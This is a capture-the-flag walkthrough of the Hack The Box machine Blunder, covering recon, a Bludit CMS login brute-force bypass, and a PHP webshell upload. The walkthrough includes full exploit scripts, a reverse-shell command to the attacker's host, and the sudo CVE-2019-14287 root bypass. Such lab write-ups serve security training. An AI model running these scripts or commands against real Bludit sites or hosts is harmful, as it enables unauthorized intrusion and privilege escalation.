# HTB: Blunder

[htb-blunder](/tags#htb-blunder ) [hackthebox](/tags#hackthebox )
[ctf](/tags#ctf ) [nmap](/tags#nmap ) [ubuntu](/tags#ubuntu )
[bludit](/tags#bludit ) [cms](/tags#cms ) [searchsploit](/tags#searchsploit )
[github](/tags#github ) [cewl](/tags#cewl ) [bruteforce](/tags#bruteforce )
[python](/tags#python ) [upload](/tags#upload ) [filter](/tags#filter )
[credentials](/tags#credentials ) [crackstation](/tags#crackstation )
[cve-2019-14287](/tags#cve-2019-14287 ) [sudo](/tags#sudo ) [oscp-
like](/tags#oscp-like ) [htaccess](/tags#htaccess )  
  
Oct 17, 2020

HTB: Blunder

![Blunder](https://0xdfimages.gitlab.io/img/blunder-cover.png)

Blunder starts with a blog that I’ll find is hosted on the BludIt CMS. Some
version enumeration and looking at releases on GitHub shows that this version
is vulnerable to a bypass of the bruteforce protections, as well as an upload
and execute filter bypass on the PHP site. I’ll write my own scripts for each
of these, and use them to get a shell. From there, I’ll find creds for the
next user, where I’ll find the first flag. Now I can also access sudo, where
I’ll see I can run sudo to get a bash shell as any non-root user. I’ll exploit
CVE-2019-14287 to run that as root, and get a root shell.

## Box Info

Name | [Blunder](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblunder) [ ![Blunder](../img/box-blunder.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblunder)  
[Play on
HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblunder)  
---|---  
Release Date | [30 May 2020](https://twitter.com/hackthebox_eu/status/1266020307531370498)  
Retire Date | 17 Oct 2020  
OS | Linux ![Linux](../img/Linux.png)  
Base Points | Easy [20]  
Rated Difficulty | ![Rated difficulty for Blunder](../img/blunder-diff.png)  
Radar Graph | ![Radar chart for Blunder](../img/blunder-radar.png)  
![First Blood User](../img/first-blood-user.png) | 00:27:50[![imth](https://www.hackthebox.com/badge/image/26267) imth](https://app.hackthebox.com/users/26267)  
  
![First Blood Root](../img/first-blood-root.png) | 00:31:10[![imth](https://www.hackthebox.com/badge/image/26267) imth](https://app.hackthebox.com/users/26267)  
  
Creator | [![egotisticalSW](https://www.hackthebox.com/badge/image/94858) egotisticalSW](https://app.hackthebox.com/users/94858)  
  
  
## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (9001):

    
    
    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.191
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:04 EDT
    Nmap scan report for 10.10.10.191
    Host is up (0.049s latency).
    Not shown: 65533 filtered ports
    PORT   STATE  SERVICE
    21/tcp closed ftp
    80/tcp open   http
    
    Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
    
    root@kali# nmap -p 21,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.191
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:06 EDT
    Nmap scan report for 10.10.10.191
    Host is up (0.18s latency).
    
    PORT   STATE  SERVICE VERSION
    21/tcp closed ftp
    80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: Blunder
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Blunder | A blunder of interesting facts
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
    

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2)
version, the host is likely running Ubuntu eoan 19.10.

### Website - TCP 80

#### Site

The site is a blog of sorts:

[ ![](https://0xdfimages.gitlab.io/img/image-20200531142139911.png)
](https://0xdfimages.gitlab.io/img/image-20200531142139911.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20200531142139911.png)

There are three posts, Stephen King, Stadia, and USB.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php,txt` since I know
the site is PHP, and since it’s an easy box so some CTF-like stuff might show
up in `.txt` files:

    
    
    root@kali# gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o scans/gobuster-root-medium -x txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.191
    [+] Threads:        20
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt
    [+] Timeout:        10s
    ===============================================================
    2020/05/30 15:21:07 Starting gobuster
    ===============================================================
    /about (Status: 200)
    /0 (Status: 200)
    /admin (Status: 301)
    ...[snip]...
    /robots.txt (Status: 200)
    ...[snip]...
    /todo.txt (Status: 200)
    /usb (Status: 200)
    ...[snip]...
    

It was slow, and started dumping errors consistently. I gave `dirsearch` run,
and it didn’t have the errors, but didn’t find anything else useful.

#### /admin

`/admin/` leads to an admin login for [Bludit](https://www.bludit.com/):

![image-20200531143852708](https://0xdfimages.gitlab.io/img/image-20200531143852708.png)

Bludit is a content management system (CMS).

#### todo.txt

`/todo.txt` returns a list of tasks.

    
    
    -Update the CMS
    -Turn off FTP - DONE
    -Remove old users - DONE
    -Inform fergus that the new blog needs images - PENDING
    

Turning off FTP explains why it was coming back closed in `nmap`. I’ll note
the username fergus seems to manage the blog. And that the task of Updating
the CMS isn’t marked done.

### Bludit Vulnerabilities

#### searchsploit

`searchsploit` returns two vulnerabilities:

    
    
    root@kali# searchsploit bludit
    ----------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                     |  Path
    ----------------------------------------------------------------------------------- ---------------------------------
    Bludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb
    bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
    ----------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
    
    

The arbitrary file upload can be RCE, but it is also from 2018, and [patched
in version 3.1.0](https://github.com/bludit/bludit/issues/812). The MSF one
looks more recent. Inside the code, there’s a reference to the [GitHub issue
describing the vuln](https://github.com/bludit/bludit/issues/1081), and that
it was patched in v3.10.0.

#### Google

Some Googling led me to [this post from
Rastating](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
from last October. It describes how Bludit has a mechanism to track requests
from a given IP and then block the IP eventually, and how there’s a bug that
allows brute force anyway. The CMS tries to get the IP from first the
`X-FORWARDED-FOR` header, than the PHP records of the client IP. It does this
because if a bunch of users sit behind a proxy, they will all have the same IP
address, and it doesn’t want to ban all of them inaccurately. The problem is
that I can control this field, so as long as I change it on each attempt, I
will never trigger the protection.

Rastating provides a proof of concept Python3 script with the post as well.

### Bludit Version

There is a version number in the CSS hrefs in the source, but it’s not clear
to me that’s it’s the Blundit version:

![image-20200621062118781](https://0xdfimages.gitlab.io/img/image-20200621062118781.png)

I searched the [Bludit
repo](https://github.com/bludit/bludit/search?q=bootstrap.min.css%3Fversion&unscoped_q=bootstrap.min.css%3Fversion)
for “bootstrap.min.css?version”, and it looks like that is the Bludit version:

![image-20200621062422807](https://0xdfimages.gitlab.io/img/image-20200621062422807.png)

I can also confirm the version using the [releases
page](https://github.com/bludit/bludit/releases), which seems to act as the
change log for the CMS. I can see that for v3.10.0, TinyMCE was updated to
5.0.16. Searching for `TinyMCE` in this repo, I see `/bl-
plugins/tinymce/metadata.json` has the version number. On Blunder, it’s 5.0.8:

![image-20200531150442296](https://0xdfimages.gitlab.io/img/image-20200531150442296.png)

This means that the Bludit is v3.9.2 or older. In the release notes for
v3.10.0, it mentions fixing both the brute force bypass and two code execution
vulnerabilities:

![image-20200601103710245](https://0xdfimages.gitlab.io/img/image-20200601103710245.png)

So this site should be vulnerable to these exploits if I can get creds.

## Shell as www-data

### Brute Force Creds for fergus

Given that I have the vulnerability that allows for credential brute force,
and the hint from `todo.txt` that fergus is a username, I’m going to try to
find creds using brute force.

#### Make Wordlist

Before just trying `rockyou`, I thought that using
[cewl](https://github.com/digininja/CeWL) to make a custom wordlist from the
site might be a more interesting path that the box author might have taken.
`cewl` will make a wordlist from a website. I’ll create one from the main page
here:

    
    
    root@kali# cewl http://10.10.10.191 > wordlist 
    

After I remove the first line with `vim` (`cewl` banner output), the list has
349 passwords:

    
    
    root@kali# wc -l wordlist 
    349 wordlist
    

#### Update Script

The POC script from Rastating proves the concept, but it isn’t set up to
exploit. I’ll make a bunch of changes, having it load my wordlist as an arg
from the command line, using `\r` to print status but on the same line so it
doesn’t blast my terminal, removing the dummy passwords. My script looks like:

    
    
    #!/usr/bin/env python3
    import re
    import requests
    import sys
    
    host = 'http://10.10.10.191'
    login_url = host + '/admin/login'
    username = 'fergus'
    
    with open(sys.argv[1], 'r') as f:
        wordlist = [x.strip() for x in f.readlines()]
    
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    
        print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)
    
        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }
    
        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }
    
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    
        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print('\rSUCCESS: Password found!' + 50*" ")
                print(f'Use {username}:{password} to login.')
                print()
                break
    

When I run it, it will show whatever password is being attempted at the
moment, eventually finding one and printing that and exiting. It takes about
16 seconds:

    
    
    root@kali# time ./bludit_brute.py wordlist 
    SUCCESS: Password found!                                                                              
    Use fergus:RolandDeschain to login.
    
    
    real    0m16.018s
    user    0m1.840s
    sys     0m0.253s
    

### PHP Upload Exploit

There’s a Metasploit script that will just run this, but I want to understand
what’s happening. There are two issues on GitHub about this,
[1079](https://github.com/bludit/bludit/issues/1079) and
[1081](https://github.com/bludit/bludit/issues/1081). The first takes
advantage of the fact that when a PHP file is uploaded, it is stored in a
temporary location before the extension check. If the extension check returns
that the file is ok, it is moved to the right location. But if the check
returns that it fails, the file is not removed from the knowable temporary
location. Code won’t run out of that location due to the `.htaccess` file from
the root of the project:

    
    
    # Deny direct access to the next directories
    rewriteRule ^bl-content/(databases|workspaces|pages|tmp)/.*$ - [R=404,L]
    

However, I can override that by uploading a new `.htaccess` file to that
directory.

The second ([1081](https://github.com/bludit/bludit/issues/1081)) is a
criticism of an incomplete fixing of the bug between versions, and as both
ticket are closed with “Fixed in Bludit v3.10.0.”, I’ll focus on the first to
start.

My script will take the following steps:

  1. Login.
  2. Get a CSRF token from the uploads page.
  3. Upload the webshell as a `.php` file. Server will say it fails, but copy will still be saved in `/bl-content/tmp`.
  4. Upload `.htaccess` file that turns off `RewriteEngine`.
  5. Trigger webshell with reverse shell on port 443.

My script is:

    
    
    #!/usr/bin/env python3
    
    import netifaces as ni
    import re
    import requests
    
    
    callback_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    username = 'fergus'
    password = 'RolandDeschain'
    url = 'http://10.10.10.191'
    
    
    s = requests.session()
    
    # Login
    resp = s.get(f'{url}/admin/')
    csrf = re.findall('name="tokenCSRF" value="([0-9a-f]{32,})"', resp.text)[0]
    s.post(f'{url}/admin/', allow_redirects=False,
            data = {'tokenCSRF': csrf, 'username': username, 'password': password, 'remember': 'true', 'save': ''})
    
    # Get CSRF to upload images
    resp = s.get(f'{url}/admin/new-content/index.php')
    csrf = re.findall('\nvar tokenCSRF = "([0-9a-f]{32,})";', resp.text)[0]
    
    # Upload webshell
    form_data = {'images[]': ('0xdf.php', '<?php system($_REQUEST["cmd"]); ?>', 'image/png')}
    data = {'uuid': 'junk',
            'tokenCSRF': csrf}
    s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    
    # Upload .htaccess file
    form_data = {'images[]': ('.htaccess', 'RewriteEngine off', 'image/png')}
    s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    
    # Trigger Shell
    resp = s.get(f'{url}/bl-content/tmp/0xdf.php', params={'cmd':f'bash -c "bash -i >& /dev/tcp/{callback_ip}/443 0>&1"'})
    

### Shell

I can run that and get a shell:

    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.191.
    Ncat: Connection from 10.10.10.191:47374.
    bash: cannot set terminal process group (1108): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
    

## Priv: www-data –> huge

### Enumeration

There’s a couple of users, and I think some intentional false paths in the
`shaun` home directory. Eventually I made it back into the `/var/www`
directory to look at the web configs. Interesting, there were two versions of
Bludit there:

    
    
    www-data@blunder:/var/www$ ls  
    bludit-3.10.0a  bludit-3.9.2  html
    

After a bunch of looking around in both directories, I found the file that
holds the database config, in `/bl-content/databases/users.php`. v3.9.2 had
two users:

    
    
    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Admin",
            "firstName": "Administrator",
            "lastName": "",
            "role": "admin",
            "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
            "salt": "5dde2887e7aca",
            "email": "",
            "registered": "2019-11-27 07:40:55",
            "tokenRemember": "",
            "tokenAuth": "b380cb62057e9da47afce66b4615107d",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "instagram": "",
            "codepen": "",
            "linkedin": "",
            "github": "",
            "gitlab": ""
        },
        "fergus": {
            "firstName": "",
            "lastName": "",
            "nickname": "",
            "description": "",
            "role": "author",
            "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
            "salt": "jqxpjfnv",
            "email": "",
            "registered": "2019-11-27 13:26:44",
            "tokenRemember": "657a282fad58fab9e0e920223c45c915",
            "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "codepen": "",
            "instagram": "",
            "github": "",
            "gitlab": "",
            "linkedin": "",
            "mastodon": ""
        }
    }
    

Based on the length, the passwords look like SHA1 hashes. Neither cracked by
goolging or [crackstation](https://crackstation.net/). In the v3.10.0 config,
there’s only one user:

    
    
    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Hugo",
            "firstName": "Hugo",
            "lastName": "",
            "role": "User",
            "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
            "email": "",
            "registered": "2019-11-27 07:40:55",
            "tokenRemember": "",
            "tokenAuth": "b380cb62057e9da47afce66b4615107d",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "instagram": "",
            "codepen": "",
            "linkedin": "",
            "github": "",
            "gitlab": ""}
    }
    

This must be what the note about cleaning up extra users was about. Perhaps
the admin is setting up version 3.10, but hasn’t configured the move yet. This
hash does break in [CrackStation](https://crackstation.net/):

![image-20200601160636705](https://0xdfimages.gitlab.io/img/image-20200601160636705.png)

### su

I’ll also note that the admin user’s name is hugo. I’ll try `su` to hugo, and
it works:

    
    
    www-data@blunder:/var/www$ su - hugo
    Password: 
    hugo@blunder:~$
    

From there I can access `user.txt`:

    
    
    hugo@blunder:~$ cat user.txt
    da700cb5************************
    

## Priv: hugo –> root

### Enumeration

`sudo -l` gives something interesting:

    
    
    hugo@blunder:~$ sudo -l
    Password: 
    Matching Defaults entries for hugo on blunder:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User hugo may run the following commands on blunder:
        (ALL, !root) /bin/bash
    

This means that I can run `sudo /bin/bash` as any user except for root, which
is a shame, as root is the user I want to run it as.

### CVE-2019-14287

The configuration above is supposed to stop `sudo` as running as the root
user. There was a public CVE release in November 2019 about how there were
other ways to enter root besides `root` that got around this restriction. This
impacts `sudo` versions before 1.8.28. I can see Blunder is running 1.8.25:

    
    
    hugo@blunder:~$ sudo --version
    Sudo version 1.8.25p1
    Sudoers policy plugin version 1.8.25p1
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.25p1
    

When running `sudo`, you can enter `-u [user]` to say which user to run as.
You can also enter the user as a number in the format `-u#[uid]`. root is used
id 0, so I can try:

    
    
    hugo@blunder:~$ sudo -u#0 /bin/bash
    Password: 
    Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
    

So far things are working as expected. The vulnerability is that I can enter
user id -1, and `sudo` will treat that as root. It works:

    
    
    hugo@blunder:~$ sudo -u#-1 /bin/bash
    Password:
    root@blunder:/home/hugo#
    

Now I can grab `root.txt`:

    
    
    root@blunder:/root# cat root.txt
    2f1f6d99************************
    

[](/2020/10/17/htb-blunder.html)

